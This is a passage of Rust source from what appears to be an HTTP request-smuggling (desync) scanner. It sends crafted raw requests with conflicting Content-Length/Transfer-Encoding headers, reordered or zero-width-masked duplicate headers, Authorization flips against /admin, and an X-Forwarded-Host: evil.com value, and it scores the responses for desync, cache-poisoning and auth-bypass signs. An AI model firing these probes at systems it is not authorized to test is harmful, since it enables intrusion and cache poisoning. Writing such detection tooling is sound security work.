                    let status_diff = oracle_response.status != test_response.status;
                    let content_diff = oracle_response.body != test_response.body;
                    let header_diff = oracle_response.headers.len() != test_response.headers.len();
                    let timing_anomaly = timing_diff > 1000;

                    let server_header_diff = oracle_response.headers.get("server")
                        != test_response.headers.get("server");
                    let via_header_present = oracle_response.headers.contains_key("via")
                        || test_response.headers.contains_key("via");
                    let cache_header_diff = oracle_response.headers.get("x-cache")
                        != test_response.headers.get("x-cache");

                    let proxy_behavior_detected = via_header_present
                        || server_header_diff
                        || cache_header_diff
                        || oracle_response.headers.contains_key("x-forwarded-for");

                    let backend_waiting_signature = test_response.body.is_empty()
                        && !oracle_response.body.is_empty()
                        && timing_anomaly;

                    let frontend_replied_signature = test_response.status == 400
                        && oracle_response.status == 200
                        && !timing_anomaly;

                    if status_diff
                        || content_diff
                        || header_diff
                        || timing_anomaly
                        || proxy_behavior_detected
                    {
                        let difference_type = {
                            let mut types = Vec::new();
                            if status_diff {
                                types.push("status_code_discrepancy");
                            }
                            if content_diff {
                                types.push("response_body_discrepancy");
                            }
                            if header_diff {
                                types.push("header_count_discrepancy");
                            }
                            if timing_anomaly {
                                types.push("timing_signature_anomaly");
                            }
                            if proxy_behavior_detected {
                                types.push("proxy_behavior_detected");
                            }
                            if backend_waiting_signature {
                                types.push("backend_waiting_signature");
                            }
                            if frontend_replied_signature {
                                types.push("frontend_replied_signature");
                            }
                            types.join(",")
                        };

                        differential_responses.push(DifferentialResponse {
                            test_name: format!("two_hop_oracle_{}", oracle_name),
                            response_a: format!(
                                "Status: {}, Headers: {}, Body Length: {}, Server: {}, Via: {}, Timing: {}ms",
                                oracle_response.status,
                                oracle_response.headers.len(),
                                oracle_response.body.len(),
                                oracle_response.headers.get("server").unwrap_or(&"none".to_string()),
                                oracle_response.headers.get("via").unwrap_or(&"none".to_string()),
                                timing_diff / 2
                            ),
                            response_b: format!(
                                "Status: {}, Headers: {}, Body Length: {}, Server: {}, Via: {}, Timing: {}ms",
                                test_response.status,
                                test_response.headers.len(),
                                test_response.body.len(),
                                test_response.headers.get("server").unwrap_or(&"none".to_string()),
                                test_response.headers.get("via").unwrap_or(&"none".to_string()),
                                timing_diff / 2
                            ),
                            difference_detected: true,
                            difference_type,
                        });
                    }
                }
                Err(_e) => {
                    differential_responses.push(DifferentialResponse {
                        test_name: format!("two_hop_oracle_{}_timeout", oracle_name),
                        response_a: "TIMEOUT_OR_ERROR".to_string(),
                        response_b: "Request failed during two-hop oracle analysis".to_string(),
                        difference_detected: true,
                        difference_type: "network_anomaly,timeout_signature".to_string(),
                    });
                }
            }

            tokio::time::sleep(Duration::from_millis(100)).await;
        }

        if differential_responses.len() >= 3 {
            differential_responses.push(DifferentialResponse {
                test_name: "two_hop_oracle_summary".to_string(),
                response_a: format!(
                    "Multiple oracle discrepancies detected: {}",
                    differential_responses.len()
                ),
                response_b: "High confidence proxy/origin parsing differences".to_string(),
                difference_detected: true,
                difference_type: "multi_hop_desync_confirmed".to_string(),
            });
        }

        differential_responses
    }

    async fn test_visibility_flip(
        &self,
        url: &str,
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        let mut results = Vec::new();
        let host = self.extract_host(url)?;

        let visibility_flip_patterns = vec![
            ("V-H_basic", 
                format!("GET / HTTP/1.1\r\nHost: {}\r\nVisible-Header: visible\r\nHidden-Header: hidden\r\n\r\n", host),
                format!("GET / HTTP/1.1\r\nHost: {}\r\nHidden-Header: hidden\r\nVisible-Header: visible\r\n\r\n", host)
            ),
            ("H-V_basic",
                format!("GET / HTTP/1.1\r\nHost: {}\r\nHidden-Header: hidden\r\nVisible-Header: visible\r\n\r\n", host), 
                format!("GET / HTTP/1.1\r\nHost: {}\r\nVisible-Header: visible\r\nHidden-Header: hidden\r\n\r\n", host)
            ),
            ("Authorization_flip",
                format!("GET /admin HTTP/1.1\r\nHost: {}\r\nAuthorization: Bearer token1\r\nX-Auth: token2\r\n\r\n", host),
                format!("GET /admin HTTP/1.1\r\nHost: {}\r\nX-Auth: token2\r\nAuthorization: Bearer token1\r\n\r\n", host)
            ),
            ("Content-Length_visibility",
                format!("POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\nX-Content-Length: 13\r\n\r\nhidden=payload", host),
                format!("POST / HTTP/1.1\r\nHost: {}\r\nX-Content-Length: 13\r\nContent-Length: 0\r\n\r\nhidden=payload", host)
            ),
            ("Transfer-Encoding_masking",
                format!("POST / HTTP/1.1\r\nHost: {}\r\nTransfer-Encoding: chunked\r\nX-Transfer-Encoding: identity\r\n\r\n5\r\nhello\r\n0\r\n\r\n", host),
                format!("POST / HTTP/1.1\r\nHost: {}\r\nX-Transfer-Encoding: identity\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\n", host)
            ),
            ("Connection_header_flip",
                format!("GET / HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\nX-Connection: close\r\n\r\n", host),
                format!("GET / HTTP/1.1\r\nHost: {}\r\nX-Connection: close\r\nConnection: keep-alive\r\n\r\n", host)
            ),
            ("Host_header_masking",
                format!("GET / HTTP/1.1\r\nHost: {}\r\nX-Forwarded-Host: evil.com\r\n\r\n", host),
                format!("GET / HTTP/1.1\r\nX-Forwarded-Host: evil.com\r\nHost: {}\r\n\r\n", host)
            ),
            ("Case_sensitivity_flip",
                format!("GET / HTTP/1.1\r\nHost: {}\r\nauthorization: bearer token\r\nAuthorization: Bearer different\r\n\r\n", host),
                format!("GET / HTTP/1.1\r\nHost: {}\r\nAuthorization: Bearer different\r\nauthorization: bearer token\r\n\r\n", host)
            ),
            ("Unicode_header_masking",
                format!("GET / HTTP/1.1\r\nHost: {}\r\nX-Real-IP: 127.0.0.1\r\nX‌-Real‌-IP: 192.168.1.1\r\n\r\n", host),
                format!("GET / HTTP/1.1\r\nHost: {}\r\nX‌-Real‌-IP: 192.168.1.1\r\nX-Real-IP: 127.0.0.1\r\n\r\n", host)
            ),
            ("Whitespace_header_hiding",
                format!("GET / HTTP/1.1\r\nHost: {}\r\nX-Forwarded-For: 10.0.0.1\r\nX-Forwarded-For : 127.0.0.1\r\n\r\n", host),
                format!("GET / HTTP/1.1\r\nHost: {}\r\nX-Forwarded-For : 127.0.0.1\r\nX-Forwarded-For: 10.0.0.1\r\n\r\n", host)
            ),
        ];

        for (pattern_name, request_a, request_b) in &visibility_flip_patterns {
            let start_time = Instant::now();
            let marker_a = self.generate_marker();
            let marker_b = self.generate_marker();

            let req_a_with_marker =
                request_a.replace("\r\n\r\n", &format!("\r\nX-Marker: {}\r\n\r\n", marker_a));
            let req_b_with_marker =
                request_b.replace("\r\n\r\n", &format!("\r\nX-Marker: {}\r\n\r\n", marker_b));

            match tokio::try_join!(
                self.send_raw_request_with_timeout(
                    url,
                    &req_a_with_marker,
                    Duration::from_millis(3000)
                ),
                self.send_raw_request_with_timeout(
                    url,
                    &req_b_with_marker,
                    Duration::from_millis(3000)
                )
            ) {
                Ok((response_a, response_b)) => {
                    let timing_ms = start_time.elapsed().as_millis() as u64;
                    let mut signals = Vec::new();
                    let mut severity = DesyncSeverity::Low;

                    let status_diff = response_a.status != response_b.status;
                    let content_diff = response_a.body != response_b.body;
                    let header_diff = response_a.headers != response_b.headers;
                    let length_diff =
                        (response_a.body.len() as i32 - response_b.body.len() as i32).abs() > 10;

                    if status_diff {
                        signals.push(DesyncSignal::StatusCodeDiscrepancy {
                            first_response: response_a.status,
                            second_response: response_b.status,
                        });
                        severity = DesyncSeverity::High;
                    }

                    if content_diff || length_diff {
                        signals.push(DesyncSignal::UnexpectedResponseLength {
                            expected: response_a.body.len(),
                            actual: response_b.body.len(),
                        });
                        if severity == DesyncSeverity::Low {
                            severity = DesyncSeverity::Medium;
                        }
                    }

                    if header_diff {
                        let mut different_headers = Vec::new();
                        for (key, val_a) in &response_a.headers {
                            if let Some(val_b) = response_b.headers.get(key) {
                                if val_a != val_b {
                                    different_headers
                                        .push(format!("{}:{} vs {}:{}", key, val_a, key, val_b));
                                }
                            }
                        }

                        if !different_headers.is_empty() {
                            signals.push(DesyncSignal::HeaderCaseModification {
                                original: different_headers.join(", "),
                                modified: "Header visibility discrepancy detected".to_string(),
                            });
                            if severity == DesyncSeverity::Low {
                                severity = DesyncSeverity::Medium;
                            }
                        }
                    }

                    let proxy_behavior_detected = response_a.headers.contains_key("via")
                        || response_b.headers.contains_key("via")
                        || response_a.headers.contains_key("x-cache")
                        || response_b.headers.contains_key("x-cache");

                    if proxy_behavior_detected && (status_diff || content_diff) {
                        signals.push(DesyncSignal::ProxyBehaviorDiscrepancy {
                            proxy_response: format!(
                                "Status: {}, Length: {}",
                                response_a.status,
                                response_a.body.len()
                            ),
                            direct_response: format!(
                                "Status: {}, Length: {}",
                                response_b.status,
                                response_b.body.len()
                            ),
                        });
                        severity = DesyncSeverity::High;
                    }

                    let authentication_bypass = pattern_name.contains("Authorization")
                        && status_diff
                        && (response_a.status == 200 || response_b.status == 200)
                        && (response_a.status == 401 || response_b.status == 401);

                    if authentication_bypass {
                        severity = DesyncSeverity::Critical;
                    }

                    if !signals.is_empty() || severity != DesyncSeverity::Low {
                        results.push(DesyncResult {
                            url: url.to_string(),
                            test_type: DesyncType::VisibilityFlip,
                            severity,
                            signals,
                            request_fingerprint: self
                                .calculate_request_fingerprint(&req_a_with_marker),
                            response_status: response_a.status,
                            contamination_marker: Some(marker_a),
                            timing_ms,
                            via_header: response_a.headers.get("via").map(|v| v.to_string()),
                            alt_svc: response_a.headers.get("alt-svc").map(|v| v.to_string()),
                            evidence: DesyncEvidence {
                                raw_request: req_a_with_marker.clone(),
                                raw_response: response_a.body.clone(),
                                connection_reused: false,
                                server_header: response_a
                                    .headers
                                    .get("server")
                                    .map(|v| v.to_string()),
                                response_headers: response_a.headers.clone(),
                                body_snippet: Some(
                                    response_a.body[..response_a.body.len().min(500)].to_string(),
                                ),
                                timing_data: TimingData {
                                    baseline_ms: 500,
                                    actual_ms: timing_ms,
                                    samples: vec![timing_ms],
                                    anomaly_detected: timing_ms > 2000,
                                },
                                connection_fingerprint: Some(format!(
                                    "visibility_flip_{}",
                                    pattern_name
                                )),
                                parser_behavior: Some(ParserBehavior {
                                    accepts_duplicate_headers: true,
                                    header_case_sensitivity: pattern_name
                                        .contains("Case_sensitivity"),
                                    chunk_extension_handling: "unknown".to_string(),
                                    te_cl_precedence: "unknown".to_string(),
                                    connection_header_behavior: if pattern_name
                                        .contains("Connection")
                                    {
                                        "discrepant".to_string()
                                    } else {
                                        "unknown".to_string()
                                    },
                                }),
                                differential_responses: vec![DifferentialResponse {
                                    test_name: format!("visibility_flip_{}", pattern_name),
                                    response_a: format!(
                                        "Status: {}, Length: {}",
                                        response_a.status,
                                        response_a.body.len()
                                    ),
                                    response_b: format!(
                                        "Status: {}, Length: {}",
                                        response_b.status,
                                        response_b.body.len()
                                    ),
                                    difference_detected: status_diff || content_diff || header_diff,
                                    difference_type: {
                                        let mut types = Vec::new();
                                        if status_diff {
                                            types.push("status");
                                        }
                                        if content_diff {
                                            types.push("content");
                                        }
                                        if header_diff {
                                            types.push("headers");
                                        }
                                        types.join(",")
                                    },
                                }],
                                cache_indicators: Vec::new(),
                            },
                        });
                    }
                }
                Err(e) => {
                    warn!(
                        "V-H/H-V visibility-flip test '{}' failed: {}",
                        pattern_name, e
                    );
                }
            }

            tokio::time::sleep(Duration::from_millis(150)).await;
        }

        Ok(results)
    }

    async fn test_non_poisoning_timeouts(
        &self,
        url: &str,
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        let mut results = Vec::new();

        if !self.config.enable_non_poisoning_mode {
            return Ok(results);
        }

        let host = self.extract_host(url)?;

        let timeout_patterns = vec![
            ("safe_cl_zero", format!("GET /health HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n", host)),
            ("safe_te_chunked", format!("GET /status HTTP/1.1\r\nHost: {}\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n0\r\n\r\n", host)),
            ("safe_expect_timeout", format!("GET /ping HTTP/1.1\r\nHost: {}\r\nExpect: 100-continue\r\nContent-Length: 0\r\nConnection: close\r\n\r\n", host)),
            ("safe_double_cl", format!("GET /api/status HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\nContent-Length: 0\r\nConnection: close\r\n\r\n", host)),
            ("safe_cl_te_confusion", format!("GET /health HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n0\r\n\r\n", host)),
            ("safe_header_folding", format!("GET /status HTTP/1.1\r\nHost: {}\r\nUser-Agent:\r\n SafeAgent/1.0\r\nConnection: close\r\n\r\n", host)),
            ("safe_chunk_ext", format!("GET /ping HTTP/1.1\r\nHost: {}\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n0;safe=test\r\n\r\n", host)),
            ("safe_method_override", format!("GET /api/info HTTP/1.1\r\nHost: {}\r\nX-HTTP-Method-Override: HEAD\r\nConnection: close\r\n\r\n", host)),
            ("safe_protocol_upgrade", format!("GET /status HTTP/1.1\r\nHost: {}\r\nConnection: close\r\nUpgrade: websocket\r\n\r\n", host)),
            ("safe_host_override", format!("GET /health HTTP/1.1\r\nHost: {}\r\nX-Forwarded-Host: localhost\r\nConnection: close\r\n\r\n", host)),
        ];

        for (pattern_name, safe_request) in &timeout_patterns {
            let start_time = Instant::now();
            let marker = self.generate_marker();

            let baseline_start = Instant::now();
            let baseline_request = format!(
                "GET / HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
                host
            );

            let baseline_timing = match self
                .send_raw_request_with_timeout(url, &baseline_request, Duration::from_millis(1000))
                .await
            {
                Ok(_) => baseline_start.elapsed().as_millis() as u64,
                Err(_) => 1000,
            };

            match self
                .send_raw_request_with_timeout(url, safe_request, Duration::from_millis(5000))
                .await
            {
                Ok(response) => {
                    let timing_ms = start_time.elapsed().as_millis() as u64;
                    let mut signals = Vec::new();
                    let mut severity = DesyncSeverity::Low;

                    let timing_anomaly = timing_ms > (baseline_timing + 1000);
                    let timeout_signature = timing_ms > 4000;
                    let connection_drop = response.body.is_empty() && timing_ms > 2000;
                    let parser_confusion = response.status == 400 && timing_ms > 1000;

                    if timing_anomaly || timeout_signature {
                        signals.push(DesyncSignal::TimingAnomaly {
                            delay_ms: timing_ms,
                            baseline_ms: baseline_timing,
                        });
                        severity = DesyncSeverity::Medium;
                    }

                    if connection_drop {
                        signals.push(DesyncSignal::ConnectionClose { forced: true });
                        if severity == DesyncSeverity::Low {
                            severity = DesyncSeverity::Medium;
                        }
                    }

                    if parser_confusion {
                        signals.push(DesyncSignal::SplitError {
                            status: response.status,
                            headers: response.headers.keys().cloned().collect(),
                        });
                        severity = DesyncSeverity::High;
                    }

                    let server_waiting_pattern =
                        timing_ms > 3000 && response.status == 200 && response.body.len() < 100;

                    if server_waiting_pattern {
                        signals.push(DesyncSignal::TimingAnomaly {
                            delay_ms: timing_ms,
                            baseline_ms: baseline_timing,
                        });
                        severity = DesyncSeverity::High;
                    }

                    let differential_behavior = timing_ms > (baseline_timing * 3)
                        && response
                            .headers
                            .get("connection")
                            .is_some_and(|v| v.contains("close"));

                    if differential_behavior {
                        signals.push(DesyncSignal::ProxyBehaviorDiscrepancy {
                            proxy_response: format!("Delayed response: {}ms", timing_ms),
                            direct_response: format!("Normal response: {}ms", baseline_timing),
                        });
                        if severity < DesyncSeverity::High {
                            severity = DesyncSeverity::High;
                        }
                    }

                    if !signals.is_empty() {
                        results.push(DesyncResult {
                            url: url.to_string(),
                            test_type: DesyncType::TimingAnomaly,
                            severity,
                            signals,
                            request_fingerprint: self.calculate_request_fingerprint(safe_request),
                            response_status: response.status,
                            contamination_marker: Some(marker),
                            timing_ms,
                            via_header: response.headers.get("via").map(|v| v.to_string()),
                            alt_svc: response.headers.get("alt-svc").map(|v| v.to_string()),
                            evidence: DesyncEvidence {
                                raw_request: safe_request.clone(),
                                raw_response: response.body.clone(),
                                connection_reused: false,
                                server_header: response
                                    .headers
                                    .get("server")
                                    .map(|v| v.to_string()),
                                response_headers: response.headers.clone(),
                                body_snippet: Some(
                                    response.body[..response.body.len().min(500)].to_string(),
                                ),
                                timing_data: TimingData {
                                    baseline_ms: baseline_timing,
                                    actual_ms: timing_ms,
                                    samples: vec![timing_ms, baseline_timing],
                                    anomaly_detected: timing_anomaly || timeout_signature,
                                },
                                connection_fingerprint: Some(format!(
                                    "safe_timeout_{}",
                                    pattern_name
                                )),
                                parser_behavior: Some(ParserBehavior {
                                    accepts_duplicate_headers: pattern_name.contains("double"),
                                    header_case_sensitivity: false,
                                    chunk_extension_handling: if pattern_name.contains("chunk") {
                                        "accepted".to_string()
                                    } else {
                                        "unknown".to_string()
                                    },
                                    te_cl_precedence: if pattern_name.contains("cl_te") {
                                        "cl_first".to_string()
                                    } else {
                                        "unknown".to_string()
                                    },
                                    connection_header_behavior: "honored_with_delay".to_string(),
                                }),
                                differential_responses: vec![DifferentialResponse {
                                    test_name: format!("safe_timeout_oracle_{}", pattern_name),
                                    response_a: format!(
                                        "Baseline: {}ms, Status: 200",
                                        baseline_timing
                                    ),
                                    response_b: format!(
                                        "Test: {}ms, Status: {}",
                                        timing_ms, response.status
                                    ),
                                    difference_detected: timing_anomaly || differential_behavior,
                                    difference_type: "non_poisoning_timeout_oracle".to_string(),
                                }],
                                cache_indicators: Vec::new(),
                            },
                        });
                    }
                }
                Err(_e) => {
                    let timing_ms = start_time.elapsed().as_millis() as u64;
                    results.push(DesyncResult {
                        url: url.to_string(),
                        test_type: DesyncType::TimingAnomaly,
                        severity: DesyncSeverity::High,
                        signals: vec![
                            DesyncSignal::TimingAnomaly {
                                delay_ms: timing_ms,
                                baseline_ms: baseline_timing,
                            },
                            DesyncSignal::ConnectionClose { forced: true },
                        ],
                        request_fingerprint: self.calculate_request_fingerprint(safe_request),
                        response_status: 0,
                        contamination_marker: Some(marker),
                        timing_ms,
                        via_header: None,
                        alt_svc: None,
                        evidence: DesyncEvidence {
                            raw_request: safe_request.clone(),
                            raw_response: "TIMEOUT: Safe request exceeded timeout threshold"
                                .to_string(),
                            connection_reused: false,
                            server_header: None,
                            response_headers: HashMap::new(),
                            body_snippet: None,
                            timing_data: TimingData {
                                baseline_ms: baseline_timing,
                                actual_ms: timing_ms,
                                samples: vec![timing_ms, baseline_timing],
                                anomaly_detected: true,
                            },
                            connection_fingerprint: Some(format!(
                                "safe_timeout_forced_{}",
                                pattern_name
                            )),
                            parser_behavior: None,
                            differential_responses: vec![DifferentialResponse {
                                test_name: format!("safe_timeout_forced_{}", pattern_name),
                                response_a: format!("Baseline: {}ms", baseline_timing),
                                response_b: format!("Timeout: {}ms", timing_ms),
                                difference_detected: true,
                                difference_type: "forced_timeout_non_poisoning".to_string(),
                            }],
                            cache_indicators: Vec::new(),
                        },
                    });
                }
            }

            tokio::time::sleep(Duration::from_millis(300)).await;
        }

        Ok(results)
    }

    async fn enhance_soc_detection(&self, results: &mut [DesyncResult]) {
        if results.is_empty() {
            return;
        }

        let mut passive_signals = Vec::new();
        let mut timing_patterns = Vec::new();
        let mut _header_anomaly_count = 0;
        let mut cross_protocol_indicators = 0;
        let mut downgrade_indicators = 0;

        for result in results.iter() {
            timing_patterns.push(result.timing_ms);

            if result.evidence.response_headers.contains_key("via") {
                passive_signals.push("proxy_presence_detected");
            }

            if result.evidence.response_headers.contains_key("x-cache") {
                passive_signals.push("cache_layer_detected");
            }

            if result
                .evidence
                .response_headers
                .get("server")
                .is_some_and(|s| {
                    s.contains("nginx") || s.contains("apache") || s.contains("cloudflare")
                })
            {
                passive_signals.push("infrastructure_fingerprint");
            }

            if result
                .evidence
                .response_headers
                .get("alt-svc")
                .is_some_and(|a| a.contains("h2"))
            {
                passive_signals.push("http2_capability");
            }

            if result.via_header.is_some() || result.alt_svc.is_some() {
                _header_anomaly_count += 1;
            }

            if matches!(result.test_type, DesyncType::HTTP2Downgrade) {
                cross_protocol_indicators += 1;
            }

            if result
                .evidence
                .response_headers
                .get("connection")
                .is_some_and(|c| c.contains("close"))
                && result.timing_ms > 1000
            {
                downgrade_indicators += 1;
            }
        }

        let timing_variance = if timing_patterns.len() > 1 {
            let mean = timing_patterns.iter().sum::<u64>() as f64 / timing_patterns.len() as f64;
            let variance = timing_patterns
                .iter()
                .map(|&x| (x as f64 - mean).powi(2))
                .sum::<f64>()
                / timing_patterns.len() as f64;
            variance.sqrt()
        } else {
            0.0
        };

        let mixed_length_indicators = results
            .iter()
            .filter(|r| {
                r.signals
                    .iter()
                    .any(|s| matches!(s, DesyncSignal::UnexpectedResponseLength { .. }))
            })
            .count();

        let timeout_asymmetry = results.iter().filter(|r| r.timing_ms > 2000).count();

        let high_confidence_threshold = results.len() / 4;
        let soc_confidence_score = passive_signals.len()
            + (if timing_variance > 500.0 { 2 } else { 0 })
            + (if mixed_length_indicators > high_confidence_threshold {
                3
            } else {
                0
            })
            + (if timeout_asymmetry > high_confidence_threshold {
                2
            } else {
                0
            })
            + (if cross_protocol_indicators > 0 { 2 } else { 0 })
            + (if downgrade_indicators > high_confidence_threshold {
                3
            } else {
                0
            });

        if soc_confidence_score >= 5 {
            for result in results.iter_mut() {
                if matches!(result.severity, DesyncSeverity::Medium) {
                    result.severity = DesyncSeverity::High;
                }

                result.evidence.cache_indicators.extend(vec![
                    format!("SOC_confidence_score: {}", soc_confidence_score),
                    format!("passive_signals: {:?}", passive_signals),
                    format!("timing_variance: {:.2}ms", timing_variance),
                    format!("mixed_length_indicators: {}", mixed_length_indicators),
                    format!("timeout_asymmetry_correlation: {}", timeout_asymmetry),
                    format!("cross_protocol_indicators: {}", cross_protocol_indicators),
                    format!("downgrade_indicators: {}", downgrade_indicators),
                ]);

                if soc_confidence_score >= 8
                    && !result
                        .signals
                        .iter()
                        .any(|s| matches!(s, DesyncSignal::ResponseContamination { .. }))
                {
                    result.signals.push(DesyncSignal::ProxyBehaviorDiscrepancy {
                        proxy_response: "High-confidence desync pattern detected".to_string(),
                        direct_response: format!(
                            "SOC score: {}, passive indicators: {}",
                            soc_confidence_score,
                            passive_signals.len()
                        ),
                    });
                }
            }
        }

        if timing_variance > 1000.0 {
            for result in results.iter_mut() {
                result.evidence.timing_data.anomaly_detected = true;

                if !result
                    .signals
                    .iter()
                    .any(|s| matches!(s, DesyncSignal::TimingAnomaly { .. }))
                {
                    result.signals.push(DesyncSignal::TimingAnomaly {
                        delay_ms: result.timing_ms,
                        baseline_ms: (timing_patterns.iter().min().unwrap_or(&500)) - 100,
                    });
                }
            }
        }

        if mixed_length_indicators >= 3 && cross_protocol_indicators >= 1 {
            for result in results.iter_mut() {
                if matches!(
                    result.test_type,
                    DesyncType::HTTP2Downgrade
                        | DesyncType::VisibilityFlip
                        | DesyncType::DoubleDesync
                ) {
                    result.severity = DesyncSeverity::Critical;

                    result
                        .evidence
                        .differential_responses
                        .push(DifferentialResponse {
                            test_name: "soc_grade_correlation".to_string(),
                            response_a: format!(
                                "Mixed length indicators: {}",
                                mixed_length_indicators
                            ),
                            response_b: format!(
                                "Cross protocol indicators: {}",
                                cross_protocol_indicators
                            ),
                            difference_detected: true,
                            difference_type: "soc_grade_multi_vector_confirmation".to_string(),
                        });
                }
            }
        }
    }
}

#[derive(Debug, Clone)]
struct RawHttpResponse {
    pub status: u16,
    pub status_text: String,
    pub headers: HashMap<String, String>,
    pub body: String,
    pub raw_response: String,
    pub http_version: String,
}

pub fn generate_desync_report(results: &[DesyncResult]) -> String {
    let mut report = String::new();

    report.push_str("# DEF CON HTTP-Must-Die Desync Scan Report\n\n");
    report.push_str(&format!("Total findings: {}\n\n", results.len()));

    let mut by_severity = std::collections::HashMap::new();
    for result in results {
        by_severity
            .entry(result.severity.clone())
            .or_insert(Vec::new())
            .push(result);
    }

    for severity in [
        DesyncSeverity::Critical,
        DesyncSeverity::High,
        DesyncSeverity::Medium,
        DesyncSeverity::Low,
        DesyncSeverity::Info,
    ] {
        if let Some(findings) = by_severity.get(&severity) {
            report.push_str(&format!(
                "## {:?} Severity ({} findings)\n\n",
                severity,
                findings.len()
            ));

            for finding in findings {
                report.push_str(&format!(
                    "- **{}**: {:?} on {}\n",
                    finding.url, finding.test_type, finding.url
                ));
                if let Some(marker) = &finding.contamination_marker {
                    report.push_str(&format!("  - Marker: {}\n", marker));
                }
                report.push_str(&format!(
                    "  - Response: {} ({}ms)\n",
                    finding.response_status, finding.timing_ms
                ));
                report.push_str(&format!("  - Signals: {}\n", finding.signals.len()));
                report.push('\n');
            }
        }
    }

    report
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_desync_config_default() {
        let config = DesyncConfig::default();
        assert!(config.safe_mode);
        assert_eq!(config.canary_prefix, "rpd");
        assert_eq!(config.max_body_size, 8192);
        assert!(config.enable_timing_analysis);
        assert!(config.enable_advanced_chunking);
        assert_eq!(config.timing_samples, 3);
        assert_eq!(config.timing_threshold_ms, 500);
    }

    #[test]
    fn test_enhanced_desync_types() {
        assert!(matches!(DesyncType::TE0, DesyncType::TE0));
        assert!(matches!(
            DesyncType::ChunkExtensions,
            DesyncType::ChunkExtensions
        ));
        assert!(matches!(
            DesyncType::HeaderCaseSensitivity,
            DesyncType::HeaderCaseSensitivity
        ));
        assert!(matches!(
            DesyncType::ConnectionReuse,
            DesyncType::ConnectionReuse
        ));
        assert!(matches!(
            DesyncType::CachePoisoning,
            DesyncType::CachePoisoning
        ));
        assert!(matches!(
            DesyncType::ParserDiscrepancy,
            DesyncType::ParserDiscrepancy
        ));
        assert!(matches!(
            DesyncType::HTTP2Downgrade,
            DesyncType::HTTP2Downgrade
        ));
        assert!(matches!(
            DesyncType::TimingAnomaly,
            DesyncType::TimingAnomaly
        ));
    }

    #[test]
    fn test_enhanced_desync_signals() {
        let signal = DesyncSignal::TimingAnomaly {
            delay_ms: 1000,
            baseline_ms: 200,
        };
        assert!(matches!(signal, DesyncSignal::TimingAnomaly { .. }));

        let cache_signal = DesyncSignal::CacheContamination {
            cache_key: "test-key".to_string(),
            poisoned_value: "evil.com".to_string(),
        };
        assert!(matches!(
            cache_signal,
            DesyncSignal::CacheContamination { .. }
        ));

        let chunk_signal = DesyncSignal::ChunkExtensionInjection {
            extension: "malicious".to_string(),
        };
        assert!(matches!(
            chunk_signal,
            DesyncSignal::ChunkExtensionInjection { .. }
        ));
    }

    #[test]
    fn test_marker_generation() {
        let config = DesyncConfig::default();
        let scanner = DesyncScanner::new(config).unwrap();
        let marker1 = scanner.generate_marker();
        let marker2 = scanner.generate_marker();

        assert_eq!(marker1.len(), 8);
        assert_eq!(marker2.len(), 8);
        assert_ne!(marker1, marker2);
    }

    #[test]
    fn test_host_extraction() {
        let config = DesyncConfig::default();
        let scanner = DesyncScanner::new(config).unwrap();

        assert_eq!(
            scanner.extract_host("https://example.com/path").unwrap(),
            "example.com"
        );
        assert_eq!(
            scanner.extract_host("http://test.com:8080").unwrap(),
            "test.com"
        );
    }

    #[test]
    fn test_enhanced_contamination_check() {
        let config = DesyncConfig::default();
        let scanner = DesyncScanner::new(config).unwrap();

        let normal_response = RawHttpResponse {
            status: 200,
            status_text: "OK".to_string(),
            headers: HashMap::new(),
            body: "Normal response with rpd-12345678 marker".to_string(),
            raw_response: "HTTP/1.1 200 OK\r\n\r\nNormal response with rpd-12345678 marker"
                .to_string(),
            http_version: "HTTP/1.1".to_string(),
        };

        assert!(scanner.check_contamination(&normal_response, "12345678"));
        assert!(!scanner.check_contamination(&normal_response, "87654321"));

        let evil_response = RawHttpResponse {
            status: 200,
            status_text: "OK".to_string(),
            headers: HashMap::new(),
            body: "Response containing evil.com domain".to_string(),
            raw_response: "HTTP/1.1 200 OK\r\n\r\nResponse containing evil.com domain".to_string(),
            http_version: "HTTP/1.1".to_string(),
        };

        assert!(scanner.check_contamination(&evil_response, "nonexistent"));

        let header_contaminated_response = RawHttpResponse {
            status: 200,
            status_text: "OK".to_string(),
            headers: HashMap::from([("x-evil".to_string(), "true".to_string())]),
            body: "Normal response".to_string(),
            raw_response: "HTTP/1.1 200 OK\r\nX-Evil: true\r\n\r\nNormal response".to_string(),
            http_version: "HTTP/1.1".to_string(),
        };

        assert!(scanner.check_contamination(&header_contaminated_response, "nonexistent"));
    }

    #[test]
    fn test_cache_indicators_detection() {
        let config = DesyncConfig::default();
        let scanner = DesyncScanner::new(config).unwrap();

        let cached_response = RawHttpResponse {
            status: 200,
            status_text: "OK".to_string(),
            headers: HashMap::from([
                ("x-cache".to_string(), "HIT".to_string()),
                ("cf-cache-status".to_string(), "HIT".to_string()),
                ("age".to_string(), "300".to_string()),
            ]),
            body: "Cached response".to_string(),
            raw_response: "HTTP/1.1 200 OK\r\nX-Cache: HIT\r\n\r\nCached response".to_string(),
            http_version: "HTTP/1.1".to_string(),
        };

        let indicators = scanner.detect_cache_indicators(&cached_response);
        assert!(!indicators.is_empty());
        assert!(indicators.iter().any(|i| i.contains("x-cache")));
        assert!(indicators.iter().any(|i| i.contains("cf-cache-status")));
    }

    #[test]
    fn test_timing_pattern_analysis() {
        let config = DesyncConfig::default();
        let scanner = DesyncScanner::new(config).unwrap();

        let stable_samples = vec![100, 110, 105, 108, 102];
        let baseline = 100;
        assert!(!scanner.analyze_timing_patterns(&stable_samples, baseline));

        let anomalous_samples = vec![100, 1500, 1600, 1550, 1200];
        assert!(scanner.analyze_timing_patterns(&anomalous_samples, baseline));

        let high_variance_samples = vec![50, 500, 100, 800, 200];
        assert!(scanner.analyze_timing_patterns(&high_variance_samples, baseline));
    }

    #[test]
    fn test_split_error_detection() {
        let config = DesyncConfig::default();
        let scanner = DesyncScanner::new(config).unwrap();

